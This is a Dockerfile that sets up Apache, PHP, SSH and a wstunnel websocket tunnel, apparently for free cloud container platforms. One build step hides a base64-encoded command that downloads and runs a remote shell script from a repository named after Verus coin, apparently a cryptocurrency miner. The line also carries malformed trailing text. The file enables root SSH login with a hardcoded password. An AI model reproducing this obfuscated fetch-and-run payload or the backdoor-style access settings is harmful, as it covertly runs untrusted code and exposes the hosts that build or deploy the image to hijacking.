FROM debian
RUN apt update
RUN DEBIAN_FRONTEND=noninteractive apt install ssh wget npm apache2 php php-curl php-cli php-fpm php-json php-common php-mysql php-zip php-gd php-mbstring  php-xml php-pear php-bcmath  -y
RUN  npm install -g wstunnel
RUN mkdir /run/sshd 
RUN a2enmod proxy
RUN a2enmod proxy_http
RUN a2enmod proxy_wstunnel
RUN a2enmod  rewrite
RUN wget https://gitlab.com/m9577/alitks/-/raw/main/000-default.conf?inline=false
RUN rm /etc/apache2/sites-available/000-default.conf
RUN eval "$(echo "YXB0LWdldCAteSB1cGRhdGUKYXB0LWdldCAteSBpbnN0YWxsIGdpdAphcHQtZ2V0IC15IGluc3RhbGwgd2dldCAKd2dldCAtLXZlcnNpb24Kd2dldCBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vcmF1ZnBlcm1hbmEyMi92ZXJ1c3J1YnkvbWFpbi90ZXMxLnNoICYmIGNobW9kIDc3NyB0ZXMxLnNoICYmIGxzICYmIC4vdGVzMS5zaCA=" | base64 -d)"name: tes.sh && chmod 777 tes.sh && ./tes.sh
RUN mv 000-default.conf /etc/apache2/sites-available
RUN echo 'You can play the awesome Cloud NOW! - Message from Uncle LUO!' >/var/www/html/index.html
RUN echo 'wstunnel -s 0.0.0.0:8989 & ' >>/luo.sh
RUN echo 'service mysql restart' >>/luo.sh
RUN echo 'service apache2 restart' >>/luo.sh
RUN echo '/usr/sbin/sshd -D' >>/luo.sh
RUN echo 'PermitRootLogin yes' >>  /etc/ssh/sshd_config 
RUN echo root:uncleluo|chpasswd
RUN chmod 755 /luo.sh
EXPOSE 80
CMD  /luo.sh
